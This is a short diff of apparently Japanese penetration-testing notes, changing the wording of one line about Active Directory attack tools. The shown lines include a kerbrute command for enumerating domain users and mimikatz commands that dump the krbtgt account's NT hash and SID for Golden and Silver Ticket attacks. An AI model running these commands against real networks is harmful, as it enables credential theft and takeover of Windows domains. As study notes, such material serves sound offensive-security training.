@@ -49,7 +49,7 @@
     GitHub上のReleaseからLinuxバイナリをインストール
   - 「`./kerbrute` userenum -d ドメイン名 --dc ドメコンIP Wordlists名 -o 出力ファイル名」Domainユーザの列挙
 - [mimikatz](https://github.com/gentilkiwi/mimikatz) (kali〇, C)  
-  「privilege::debug」→「[output '20' OK]」でAdministrator権限を確認
+  「privilege::debug」→「[output '20' OK]」でAdministrator権限であるか確認
   - Golden/Silver Ticket Attacks  
     「lsadump::lsa /inject /name:krbtgt」  
     krbtgtアカウントのNTハッシュやSIDをダンプ（SilverTicketの場合は/nameで指定のユーザを指定）  
